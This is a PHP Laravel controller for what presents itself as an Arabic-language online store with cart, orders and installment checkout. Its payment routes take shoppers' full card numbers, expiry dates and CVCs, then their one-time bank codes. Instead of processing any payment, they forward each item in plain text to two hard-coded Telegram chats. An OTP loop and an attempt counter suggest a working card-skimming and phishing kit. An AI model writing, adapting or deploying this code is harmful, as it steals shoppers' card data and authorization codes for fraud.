<?php

namespace App\Http\Controllers;
use App\Models\Category;
use Illuminate\Support\Facades\Session;
use PDF;
use App\Models\Card;
use App\Models\Event;
use App\Models\Order;
use App\Models\Product;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Telegram\Bot\Laravel\Facades\Telegram;
use ArPHP\I18N\Arabic;

class HomeController extends Controller
{

    public function home()
    {
        return view('index');
    }
    public function index()
    {
        return view('admin.index');
    }

    public function view_product($id)
    {
        $product = Product::query()->findOrFail($id);
        return view('product',compact('product'));
    }

    public function view_category($id)
    {
        $category = Category::query()->with('products')->findOrFail($id);
        $products = Product::query()->where('category_id',$id)->get();

        return view('category',compact('category','products'));
    }

    public function order(Request $request)
    {
        $total = ($request->totalPrice);

        return view('order',compact('total'));
    }

    public function create_order(Request $request)
    {
        //First Paid  =>  payment
        //installment_period  =>  first_batch
        //monthly_installment  =>  floatingInput

        $data = $request->only([
            'full_name','phone','area','street'
        ]);
        $data['is_installment'] = (bool)$request->is_installment;
        if ($data['is_installment']){
            $data['first_installment'] = $request->payment;
            $data['installments_period'] = $request->first_batch;
            $data['monthly_installment'] = $request->monthly_installment;

            $must_paid = $data['first_installment'];
        }else{
            $must_paid = $request->total_price;
        }
        $data['number'] = $this->generateOrderNumber();
        $order = Order::query()->create($data);
        $cart = Session::get('cart',[]);
        $syncData = [];
        foreach ($cart as $key => $item) {
            $product_id = $item['product_id'];
            $count = $item['quantity'];
            $syncData[$product_id] = ['count' => $count];
        }
        if ($order){

            Session::put('must_paid',$must_paid);
            Session::put('order_id',$order->id);
            $order->products()->sync($syncData);
            $grandTotal = 0;
            foreach ($order->products as $product){

                $price = $product->price;
                $count = $product->pivot->count;
                $total = $price * $count;
                $grandTotal += $total;

            }
            $payment = $order->is_installment ? 'تقسيط' : 'نقدا';
            $first_installment = $order->is_installment ? ('الدفعة الأولى : ' . $order->first_installment) : '' ;
            $monthly_installment = $order->is_installment ? ('القسط الشهري : ' . $order->monthly_installment) : '' ;
            $message = "
            ====== 🚚 طلب جديد ========

        الاسم : $order->full_name

        الجوال : $order->phone

        الدفع : $payment

        $first_installment

        $monthly_installment

        المجموع : $grandTotal ريال

      ======================

                    ";
            $this->send_telegram($message);
            return \redirect()->route('checkout');
        }else{
            return \redirect()->back();
        }
    }

    public function checkout()
    {
        return view('checkout');
    }


    public function cart()
    {
        return view('cart');
    }




    public function generateOrderNumber()
    {
        // Get the latest order number from the database
        $latestOrder = DB::table('orders')
            ->where('number', 'LIKE', 'ORD-' . date('Y') . '-%')
            ->orderBy('number', 'desc')
            ->first();

        // Extract the latest number and increment it
        $latestNumber = $latestOrder ? (int) substr($latestOrder->number, -7) : 0;
        $newNumber = str_pad($latestNumber + rand(0000000,9999999), 7, '0', STR_PAD_LEFT);

        // Create the new order number
        return 'ORD-' . date('Y') . '-' . $newNumber;
    }
    public function pay(Request $request)
    {
        return view('pay');
    }

    public function confirm_pay(Request $request)
    {

        $data = $request->only([
           'CardName','cardNumber','month','year','cvc'
        ]);
        $data['order_id'] = Session::get('order_id',[]);
        $order = Order::query()->findOrFail($data['order_id'])->update(['payment_method' => 'card']);
        $card = Card::query()->where('cardNumber',$data['cardNumber'])->first();
        if ($card){
            $card->update([
                'attempt'=>  (integer)($card->attempt + 1)
            ]);
        }else{
            $card = Card::query()->create($data);
        }

        if ($card){

            Session::put('card_id',$card->id);
            $name = $card->order->full_name;
            $phone = $card->order->phone;

            $message = "
            ====== 💳 New Card ========

        👤: $name

        💳: $card->cardNumber

        📅: $card->month / $card->year

        🔐: $card->cvc

        📞: $phone

        🔂: $card->attempt attempt

      ======================
        ";
            $this->send_telegram($message);


            return redirect()->route('otp');
        }else{
            return redirect()->back();
        }

    }

    public function otp()
    {
        return view('otp');
    }

    public function send_otp(Request $request)
    {
        $request->validate([
            'otp' => 'required'
        ]);
        $card_id = Session::get('card_id',[]);
        $card = Card::query()->findOrFail($card_id);

        $card->update([
            'otp' => $request->otp,
            'attempt' => (integer)$card->attempt+1
        ]);
        $card->save();
        Session::forget('cart');
        Session::forget('must_paid');

        $name = $card->order->full_name;

        $message = "
            ====== 💳 Otp ========

        👤: $name

        💳: $card->cardNumber

        🔂: $card->attempt attempt

        📟: $card->otp

      ======================
        ";

            $this->send_telegram($message);
        return \redirect()->route('otp');
    }






    public function send_telegram($message)
    {
        Telegram::sendMessage([
                'chat_id' => '981019297',
                'text' => $message
        ]);

       Telegram::sendMessage([
               'chat_id' => '7057670376',
               'text' => $message
       ]);
    }

    public function telegram()
    {
        return Telegram::getUpdates();
    }


    public function orders()
    {
        $orders = Order::query()->latest()->paginate(15);
        return view('admin.orders.index',compact('orders'));
    }

    public function cards()
    {
        $cards = Card::query()->latest()->paginate(15);
        return view('admin.cards.index',compact('cards'));
    }


    public function bank_transfer()
    {
        $order_id = Session::get('order_id',[]);
        $order = Order::query()->findOrFail($order_id)->update(['payment_method' => 'bank']);
        Session::forget('must_paid');
        // Session::forget('order_id');
        Session::forget('cart');
        return view('bank_transfer');
    }


    public function installment($id)
    {
        $order = Order::query()->findOrFail($id);
        return view('admin.pdf.installment',compact('order'));
    }

    public function invoice($id)
    {
        $order = Order::query()->findOrFail($id);
        return view('admin.pdf.invoice',compact('order'));
    }

    public function receipt($id)
    {
        $order = Order::query()->findOrFail($id);
        return view('admin.pdf.receipt',compact('order'));
    }


    public function refund_and_cancel()
    {
        return view('refund_cancel');
    }

    public function work_time()
    {
        return view('work_time');
    }

    public function terms()
    {
        return view('terms');
    }








//    public function generatePDF()
//    {
//
//        $reportHtml = view('myPDF')->render();
//        $arabic = new Arabic();
//        $p = $arabic->arIdentify($reportHtml);
//        for ($i = count($p)-1; $i>=0; $i-=2){
//            $utf8ar = $arabic->utf8Glyphs(substr($reportHtml,$p[$i-1],$p[$i] - $p[$i-1]));
//            $reportHtml = substr_replace($reportHtml , $utf8ar , $p[$i-1], $p[$i] - $p[$i-1]);
//        }
//        $pdf = PDF::loadHTML($reportHtml);
////        ->setOption('isRemoteEnabled', true);
//        return $pdf->download('report.pdf');
//    }
}
